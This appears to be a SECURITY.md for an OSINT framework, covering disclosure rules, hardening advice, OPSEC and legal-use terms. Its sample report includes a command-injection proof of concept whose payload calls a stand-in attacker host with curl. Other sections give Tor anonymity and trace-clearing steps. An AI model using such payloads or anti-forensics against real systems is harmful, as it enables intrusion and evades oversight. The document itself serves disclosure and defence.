# Security Policy

## Supported Versions

Nexus Intelligence Framework follows semantic versioning with security patches applied only to supported releases.

| Version | Status | Security Support | End of Life |
|---------|--------|------------------|-------------|
| 1.0.x   | Current | Active security patches | N/A |
| < 1.0   | Unsupported | No security updates | 2025-01-24 |

**Current Stable Release**: v1.0.0 (2025-01-12)

---

## Reporting Security Vulnerabilities

### Private Disclosure Process

**Security vulnerabilities must be reported privately to maintain responsible disclosure.**

**Contact**: genzt.dev@pm.me

### Required Information

Include the following details in your security report:

1. **Vulnerability Classification**
   - Type: Authentication bypass, injection, privilege escalation, information disclosure, etc.
   - CVSS v3.1 score (if calculated): https://www.first.org/cvss/calculator/3.1
   - Attack vector: Network, Local, Physical
   - Attack complexity: Low, High
   - Privileges required: None, Low, High
   - User interaction: None, Required

2. **Affected Components**
   - Framework version(s): 1.0.0, all versions, etc.
   - Affected module(s): HTTPEngine, GitHubIntel, ExportManager, etc.
   - Affected function(s): Specific method names and line numbers
   - Configuration dependencies: Does it require specific config to trigger?

3. **Technical Details**
   - Root cause analysis: Why does the vulnerability exist?
   - Code location: File path, line numbers, function names
   - Triggering conditions: What circumstances enable exploitation?
   - Data flow: How does malicious input reach vulnerable code?

4. **Reproduction Steps**
   - Environment setup: OS, Python version, dependencies
   - Step-by-step exploit procedure (numbered list)
   - Expected vulnerable behavior vs. actual secure behavior
   - Minimum configuration to reproduce (avoid complex setups)

5. **Proof of Concept**
   - Exploit code demonstrating the vulnerability
   - Sample payloads or input that trigger the issue
   - Screenshots or logs showing successful exploitation
   - Network traffic captures (if applicable)

6. **Impact Assessment**
   - Confidentiality impact: What data can be accessed?
   - Integrity impact: What data can be modified?
   - Availability impact: Can the system be disabled?
   - Real-world exploitation scenarios
   - Affected user base: All users, authenticated users, specific configurations

7. **Proposed Remediation** (optional but appreciated)
   - Suggested code fix with diff or patch
   - Alternative mitigation strategies
   - Configuration changes to reduce risk
   - Detection signatures for exploitation attempts

### Example Security Report

```
Subject: [SECURITY] Command Injection in DomainIntel Module

Vulnerability Type: OS Command Injection
CVSS v3.1: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Affected Versions: 1.0.0
Affected Component: src/modules/domain.py, DomainIntel._analyze_whois()

Technical Details:
The whois.whois(domain) call passes unsanitized user input directly to 
the underlying whois command-line utility without proper escaping. An 
attacker can inject shell metacharacters to execute arbitrary commands.

Root Cause:
Line 759: whois_data = whois.whois(domain)
The 'domain' parameter is user-controlled and not validated before being 
passed to subprocess calls within the whois library.

Reproduction Steps:
1. Install nexus-intelligence v1.0.0
2. Run: python -m src.osint_framework --domain "example.com; id"
3. Observe command execution in output

Proof of Concept:
python -m src.osint_framework --domain "test.com; curl http://attacker.com/$(whoami)"

The framework executes:
- whois test.com
- curl http://attacker.com/username

Impact:
- Arbitrary command execution with framework process privileges
- Potential data exfiltration from investigation results
- System compromise if running as privileged user
- Affects all users using domain investigation mode

Proposed Fix:
Sanitize domain input before WHOIS lookup:

import re

def _validate_domain(domain: str) -> str:
    """Validate and sanitize domain name."""
    # Allow only valid domain characters
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', domain):
        raise ValueError(f"Invalid domain format: {domain}")
    return domain

def _analyze_whois(self, domain: str, intel: Dict):
    validated_domain = self._validate_domain(domain)
    whois_data = whois.whois(validated_domain)
```

### Response Timeline

- **Initial Response**: Within 48 hours of report receipt
- **Vulnerability Confirmation**: Within 7 days
- **Patch Development**: 14-30 days depending on severity
- **Coordinated Disclosure**: 90 days from initial report (standard industry practice)
- **CVE Assignment**: Requested for Medium severity and above

### Security Acknowledgments

Researchers who responsibly disclose vulnerabilities will be credited in:
- Security advisory (GitHub Security Advisories)
- CHANGELOG.md release notes
- SECURITY.md acknowledgments section (below)

Credit format: `[Researcher Name] - [Vulnerability Type] - [Date]`

---

## Security Best Practices

### Credential Management

**Never commit credentials to version control:**

```bash
# Add to .gitignore
.env
*.key
*.pem
config/secrets.yaml
api_tokens.txt
credentials.json
```

**Use environment variables for API tokens:**

```python
# Bad: Hardcoded credentials
GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuv"

# Good: Environment variable
import os
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
if not GITHUB_TOKEN:
    raise EnvironmentError("GITHUB_TOKEN environment variable not set")
```

**Use .env files for local development:**

```bash
# .env file (never commit this)
GITHUB_TOKEN=ghp_your_token_here
SHODAN_API_KEY=your_key_here
HTTP_PROXY=socks5://127.0.0.1:9050
```

```python
# Load environment variables from .env
from dotenv import load_dotenv
load_dotenv()
```

### Network Security

**Use HTTPS proxies to prevent credential exposure:**

```bash
# Bad: HTTP proxy exposes tokens in plaintext
--proxy http://proxy.example.com:8080

# Good: HTTPS proxy encrypts traffic
--proxy https://proxy.example.com:8443

# Best: SOCKS5 over SSH tunnel
ssh -D 9050 user@proxy-server
--proxy socks5://127.0.0.1:9050
```

**Implement request throttling to avoid rate limit bans:**

```python
# HTTPEngine already implements rate limiting:
# - 5 retry attempts with exponential backoff
# - Automatic sleep on HTTP 429 (rate limit exceeded)
# - X-RateLimit-Remaining header tracking

# For additional safety, add delays between investigations:
import time
for target in targets:
    results = system.investigate(target)
    time.sleep(2)  # 2 second delay between targets
```

**Monitor network traffic for credential leaks:**

```bash
# Use Wireshark or tcpdump to verify no plaintext credentials
sudo tcpdump -i any -A -s 0 'tcp port 443 and host api.github.com'

# Check for leaked tokens in DNS queries
sudo tcpdump -i any -n 'udp port 53'
```

### Input Validation

**All user-controlled input must be validated:**

```python
import re

def validate_username(username: str) -> str:
    """Validate GitHub username format."""
    if not re.match(r'^[a-zA-Z0-9](?:[a-zA-Z0-9]|-(?=[a-zA-Z0-9])){0,38}$', username):
        raise ValueError(f"Invalid GitHub username: {username}")
    return username

def validate_domain(domain: str) -> str:
    """Validate domain name format."""
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', domain):
        raise ValueError(f"Invalid domain format: {domain}")
    return domain

def validate_email(email: str) -> str:
    """Validate email address format."""
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError(f"Invalid email format: {email}")
    return email
```

### Output Sanitization

**Prevent XSS in HTML reports:**

```python
from html import escape

# HTMLExporter already uses Jinja2 autoescaping
# For manual HTML generation:
user_data = escape(untrusted_input)
html = f"<div>{user_data}</div>"
```

**Sanitize filenames to prevent path traversal:**

```python
from pathlib import Path

def sanitize_filename(filename: str) -> str:
    """Remove path traversal sequences and dangerous characters."""
    # Remove directory components
    filename = Path(filename).name
    
    # Remove dangerous characters
    filename = re.sub(r'[<>:"|?*]', '', filename)
    
    # Prevent hidden files on Unix
    if filename.startswith('.'):
        filename = '_' + filename
    
    return filename or 'output'
```

### Dependency Management

**Keep dependencies updated for security patches:**

```bash
# Check for known vulnerabilities
pip install safety
safety check

# Update to latest secure versions
pip install --upgrade requests urllib3 dnspython

# Pin versions in requirements.txt for reproducibility
requests==2.31.0
urllib3==2.2.1
dnspython==2.6.1
```

**Review dependency tree for supply chain risks:**

```bash
# View all dependencies and sub-dependencies
pip install pipdeptree
pipdeptree

# Check for dependencies with known CVEs
pip-audit
```

### Secure Configuration

**Disable SSL verification only when necessary:**

```python
# HTTPEngine defaults to verify=False for flexibility
# For production environments, enable verification:
import requests

response = requests.get(
    url,
    verify=True,  # Enable SSL verification
    timeout=20
)

# For corporate proxies with self-signed certificates:
response = requests.get(
    url,
    verify='/path/to/ca-bundle.crt',  # Custom CA bundle
    timeout=20
)
```

**Set restrictive file permissions:**

```bash
# Configuration files should not be world-readable
chmod 600 .env
chmod 600 config/secrets.yaml

# Output directory should be user-only
chmod 700 output/
```

---

## Operational Security (OPSEC)

### Anonymity Best Practices

**Use Tor for maximum anonymity:**

```bash
# Start Tor service
sudo systemctl start tor

# Route traffic through Tor
python -m src.osint_framework -t target --proxy socks5://127.0.0.1:9050

# Verify Tor circuit
curl --socks5 127.0.0.1:9050 https://check.torproject.org
```

**Rotate exit nodes between investigations:**

```bash
# Force new Tor circuit
echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051

# Wait for circuit establishment
sleep 10
```

**Use VPN with proxy chaining:**

```
Your Computer → VPN → Tor → Target
[Encrypted]      [Anonymized]    [Request]
```

### Artifact Cleanup

**Clear investigation traces:**

```bash
# Clear cache directory
rm -rf ~/.cache/nexus-intelligence/

# Clear Python bytecode
find . -type d -name "__pycache__" -exec rm -rf {} +
find . -type f -name "*.pyc" -delete

# Securely delete output files
shred -vfz -n 10 output/*.json
```

**Disable logging for sensitive investigations:**

```bash
# Disable all logging
python -m src.osint_framework -t target --quiet

# Or redirect to /dev/null
python -m src.osint_framework -t target 2>/dev/null
```

### Rate Limit Avoidance

**Respect platform rate limits:**

- GitHub unauthenticated: 60 requests/hour
- GitHub authenticated: 5000 requests/hour
- HIBP API: 1 request per 1.5 seconds
- Social platforms: varies by platform

**Implement delays between requests:**

```python
# Already implemented in HTTPEngine retry logic
# Manual delay for batch processing:
import time

for target in targets:
    results = system.investigate(target)
    time.sleep(5)  # 5 second delay
    
    # Exponential backoff on failure
    if not results['github']['found']:
        time.sleep(30)  # Wait longer on errors
```

---

## Legal Use Authorization

### Authorized Use Cases

This framework is designed for **legitimate security research and authorized assessments only.**

**Permitted uses:**
- Authorized penetration testing with signed engagement letters
- Bug bounty programs within defined scope
- Academic research with institutional review board (IRB) approval
- Personal information verification for one's own accounts
- Corporate security assessments with management authorization
- Digital forensics investigations with legal authority

### Prohibited Activities

**Unauthorized use of this framework for the following activities is strictly prohibited:**

- **Unauthorized Access**: Investigating targets without explicit written permission
- **Terms of Service Violations**: Bypassing rate limits, scraping prohibited content
- **Data Harvesting**: Bulk collection of personal data for commercial purposes
- **Harassment**: Using framework for stalking, doxxing, or intimidation
- **Malicious Intent**: Facilitating illegal activities or causing harm to individuals
- **Corporate Espionage**: Competitive intelligence gathering without authorization

### Legal Compliance

**Users are responsible for compliance with applicable laws:**

- **Computer Fraud and Abuse Act (CFAA)** - United States (18 U.S.C. § 1030)
- **Computer Misuse Act 1990** - United Kingdom
- **General Data Protection Regulation (GDPR)** - European Union
- **California Consumer Privacy Act (CCPA)** - California, USA
- **Lei Geral de Proteção de Dados (LGPD)** - Brazil
- **Personal Information Protection and Electronic Documents Act (PIPEDA)** - Canada

**Unauthorized access to computer systems is a criminal offense in most jurisdictions.**

### Ethical Guidelines

Contributors and users must adhere to ethical standards:

- Obtain explicit authorization before investigating any target
- Respect privacy and data protection regulations
- Report discovered vulnerabilities responsibly (90-day disclosure)
- Do not exploit vulnerabilities beyond proof-of-concept verification
- Prioritize defensive security over offensive exploitation
- Act with integrity, transparency, and respect for intellectual property

---

## Incident Response

### Security Incident Handling

If you discover a security incident involving this framework:

1. **Document the incident**: Timestamp, affected systems, actions taken
2. **Isolate affected systems**: Disconnect from network if compromised
3. **Contact framework maintainers**: genzt.dev@pm.me with incident details
4. **Preserve evidence**: Do not modify logs or system state
5. **Conduct post-incident review**: Identify root cause and implement fixes

### Breach Notification

If framework misuse results in a data breach:

- Notify affected parties within 72 hours (GDPR requirement)
- Report to relevant data protection authorities
- Document breach scope, affected data, and remediation steps
- Implement additional security controls to prevent recurrence

---

## Security Acknowledgments

We thank the following security researchers for responsible disclosure:

*(No vulnerabilities reported as of 2025-12-01)*

---

## Security Resources

### External References

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **CWE Top 25**: https://cwe.mitre.org/top25/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **CVSS Calculator**: https://www.first.org/cvss/calculator/3.1
- **Responsible Disclosure Guide**: https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html

### Framework-Specific Security

- **Contributing Guidelines**: See [CONTRIBUTING.md](CONTRIBUTING.md) for security-focused development practices
- **Changelog**: See [CHANGELOG.md](CHANGELOG.md) for security patch history
- **Issue Tracker**: Report non-security bugs at genesis.issues@pm.me

---

## Contact

- **Security Vulnerabilities**: genzt.dev@pm.me (private disclosure)
- **Bug Reports**: genesis.issues@pm.me (non-security issues)
- **General Inquiries**: genzt.dev@pm.me

**PGP Key**: Available upon request for encrypted communication

---

*Last Updated: 2025-12-01*  
*Document Version: 1.0*  
*Framework Version: 1.0.0*
